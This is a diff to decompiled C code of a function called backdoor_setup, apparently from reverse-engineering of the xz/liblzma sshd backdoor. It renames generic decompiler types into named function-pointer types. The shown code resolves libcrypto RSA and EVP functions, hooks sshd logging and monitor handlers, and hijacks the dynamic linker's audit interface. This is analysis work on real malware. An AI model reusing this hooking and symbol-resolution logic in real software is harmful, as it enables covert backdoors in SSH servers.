@@ -36,7 +36,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   pfn_RSA_get0_key_t ppVar11;
   pfn_EVP_PKEY_set1_RSA_t ppVar12;
   sshd_monitor_func_t psVar13;
-  _func_67 *p_Var14;
+  elf_symbol_get_addr_fn peVar14;
   Elf64_Addr EVar15;
   Elf64_Ehdr *pEVar16;
   sshd_ctx_t *psVar17;
@@ -52,19 +52,19 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   BOOL BVar26;
   void *pvVar27;
   lzma_allocator *plVar28;
-  _func_17 *p_Var29;
+  pfn_malloc_usable_size_t ppVar29;
   lzma_allocator *plVar30;
   elf_info_t *peVar31;
-  _func_41 *p_Var32;
+  pfn_EVP_MD_CTX_new_t ppVar32;
   void *pvVar33;
   elf_functions_t *peVar34;
-  _func_60 *p_Var35;
+  pfn_BN_free_t ppVar35;
   Elf64_Sym *pEVar36;
   char *pcVar37;
-  _func_58 *p_Var38;
+  pfn_BN_bn2bin_t ppVar38;
   Elf64_Sym *pEVar39;
   Elf64_Sym *pEVar40;
-  _func_55 *p_Var41;
+  pfn_RSA_set0_key_t ppVar41;
   Elf64_Sym *pEVar42;
   Elf64_Rela *mem_address;
   int *piVar43;
@@ -226,8 +226,7 @@ LAB_00105951:
             psVar53->logging_disabled = FALSE;
             psVar53 = (sshd_log_ctx_t *)((long)psVar53 + (ulong)bVar62 * -8 + 4);
           }
-          (local_b10->sshd_log_ctx).mm_log_handler = (_func_63 *)params->hook_params->mm_log_handler
-          ;
+          (local_b10->sshd_log_ctx).mm_log_handler = params->hook_params->mm_log_handler;
           *params->shared->globals = ctx;
           piVar54 = imported_funcs;
           for (lVar45 = 0x4a; lVar45 != 0; lVar45 = lVar45 + -1) {
@@ -247,9 +246,9 @@ LAB_00105951:
           (local_b10->libc_imports).__libc_stack_end = local_aa8;
           plVar28 = get_lzma_allocator();
           plVar28->opaque = local_980.elf_handles.libc;
-          p_Var29 = (_func_17 *)lzma_alloc(0x440,plVar28);
-          (local_b10->libc_imports).malloc_usable_size = p_Var29;
-          if (p_Var29 != (_func_17 *)0x0) {
+          ppVar29 = (pfn_malloc_usable_size_t)lzma_alloc(0x440,plVar28);
+          (local_b10->libc_imports).malloc_usable_size = ppVar29;
+          if (ppVar29 != (pfn_malloc_usable_size_t)0x0) {
             (local_b10->libc_imports).resolved_imports_count =
                  (local_b10->libc_imports).resolved_imports_count + 1;
           }
@@ -262,9 +261,9 @@ LAB_00105951:
           if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
             peVar31 = (elf_info_t *)
                       elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
-            p_Var32 = (_func_41 *)lzma_alloc(0xaf8,plVar30);
-            (local_b10->imported_funcs).EVP_MD_CTX_new = p_Var32;
-            if (p_Var32 != (_func_41 *)0x0) {
+            ppVar32 = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,plVar30);
+            (local_b10->imported_funcs).EVP_MD_CTX_new = ppVar32;
+            if (ppVar32 != (pfn_EVP_MD_CTX_new_t)0x0) {
               puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
               *puVar1 = *puVar1 + 1;
             }
@@ -281,12 +280,12 @@ LAB_00105951:
           (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)pvVar33;
           peVar34 = get_elf_functions_address();
           if (((peVar34 == (elf_functions_t *)0x0) ||
-              (p_Var14 = peVar34->elf_symbol_get_addr, p_Var14 == (_func_67 *)0x0)) ||
-             (peVar34->elf_parse == (_func_68 *)0x0)) goto LAB_00105a60;
+              (peVar14 = peVar34->elf_symbol_get_addr, peVar14 == (elf_symbol_get_addr_fn)0x0)) ||
+             (peVar34->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
           pEVar36 = (Elf64_Sym *)0x0;
-          p_Var35 = (_func_60 *)(*p_Var14)(local_980.elf_handles.libcrypto,STR_BN_free);
-          (local_b10->imported_funcs).BN_free = p_Var35;
-          if (p_Var35 != (_func_60 *)0x0) {
+          ppVar35 = (pfn_BN_free_t)(*peVar14)(local_980.elf_handles.libcrypto,STR_BN_free);
+          (local_b10->imported_funcs).BN_free = ppVar35;
+          if (ppVar35 != (pfn_BN_free_t)0x0) {
             pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
           }
           local_acc = STR_ssh_rsa_cert_v01_openssh_com;
@@ -298,28 +297,30 @@ LAB_00105951:
           (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
           if (pcVar37 == (char *)0x0) goto LAB_00105a60;
           pEVar39 = (Elf64_Sym *)0x0;
-          p_Var38 = (_func_58 *)elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
-          (local_b10->imported_funcs).BN_bn2bin = p_Var38;
-          if (p_Var38 != (_func_58 *)0x0) {
+          ppVar38 = (pfn_BN_bn2bin_t)
+                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
+          (local_b10->imported_funcs).BN_bn2bin = ppVar38;
+          if (ppVar38 != (pfn_BN_bn2bin_t)0x0) {
             pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
             if (pEVar39 != (Elf64_Sym *)0x0) {
               EVar15 = pEVar39->st_value;
               pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
               puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
               *puVar1 = *puVar1 + 1;
-              (local_b10->imported_funcs).BN_dup = (_func_53 *)(pEVar16->e_ident + EVar15);
+              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(pEVar16->e_ident + EVar15);
             }
             pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
-            if ((local_b10->imported_funcs).BN_free != (_func_60 *)0x0) {
+            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
               puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
               *puVar1 = *puVar1 + 1;
             }
           }
           pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
-          p_Var41 = (_func_55 *)(*p_Var14)(local_980.elf_handles.libcrypto,STR_RSA_set0_key);
+          ppVar41 = (pfn_RSA_set0_key_t)(*peVar14)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
+          ;
           pEVar42 = (Elf64_Sym *)0x0;
-          (local_b10->imported_funcs).RSA_set0_key = p_Var41;
-          if (p_Var41 != (_func_55 *)0x0) {
+          (local_b10->imported_funcs).RSA_set0_key = ppVar41;
+          if (ppVar41 != (pfn_RSA_set0_key_t)0x0) {
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
             pEVar42 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
@@ -332,7 +333,7 @@ LAB_00105951:
                    (pfn_RSA_get0_key_t)(pEVar16->e_ident + EVar15);
             }
           }
-          if ((local_b10->imported_funcs).BN_bn2bin != (_func_58 *)0x0) {
+          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
           }
@@ -345,28 +346,28 @@ LAB_00105951:
             pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
-            (local_b10->imported_funcs).BN_bin2bn = (_func_54 *)(pEVar16->e_ident + EVar15);
+            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(pEVar16->e_ident + EVar15);
           }
           if (pEVar39 != (Elf64_Sym *)0x0) {
             EVar15 = pEVar39->st_value;
             pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
-            (local_b10->imported_funcs).RSA_new = (_func_52 *)(pEVar16->e_ident + EVar15);
+            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(pEVar16->e_ident + EVar15);
           }
           if (pEVar40 != (Elf64_Sym *)0x0) {
             EVar15 = pEVar40->st_value;
             pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
-            (local_b10->imported_funcs).RSA_free = (_func_59 *)(pEVar16->e_ident + EVar15);
+            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(pEVar16->e_ident + EVar15);
           }
           if (pEVar42 != (Elf64_Sym *)0x0) {
             EVar15 = pEVar42->st_value;
             pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
             puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
             *puVar1 = *puVar1 + 1;
-            (local_b10->imported_funcs).RSA_sign = (_func_57 *)(pEVar16->e_ident + EVar15);
+            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(pEVar16->e_ident + EVar15);
           }
           pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
           peVar31 = local_980.elf_handles.main;
@@ -783,14 +784,16 @@ LAB_00106bf0:
     pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
     puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
     *puVar1 = *puVar1 + 1;
-    (local_b10->imported_funcs).EVP_DecryptUpdate = (_func_48 *)(pEVar16->e_ident + EVar15);
+    (local_b10->imported_funcs).EVP_DecryptUpdate =
+         (pfn_EVP_DecryptUpdate_t)(pEVar16->e_ident + EVar15);
   }
   if (pEVar39 != (Elf64_Sym *)0x0) {
     EVar15 = pEVar39->st_value;
     pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
     puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
     *puVar1 = *puVar1 + 1;
-    (local_b10->imported_funcs).EVP_DecryptFinal_ex = (_func_49 *)(pEVar16->e_ident + EVar15);
+    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
+         (pfn_EVP_DecryptFinal_ex_t)(pEVar16->e_ident + EVar15);
   }
   BVar26 = init_imported_funcs(imported_funcs);
   if (((((((BVar26 != FALSE) &&
@@ -843,8 +846,8 @@ LAB_00106bf0:
       *(undefined4 *)&paVar57->activity = 0;
       paVar57 = (audit_ifaces *)((long)paVar57 + (ulong)bVar62 * -8 + 4);
     }
-    (local_b10->ldso_ctx).hooked_audit_ifaces.field4_0x20 =
-         (_union_35)params->hook_params->symbind64;
+    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
+         (audit_symbind_fn_t)params->hook_params->symbind64;
     *(local_b10->ldso_ctx)._dl_audit_ptr = paVar2;
     *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
     lVar45 = 0;
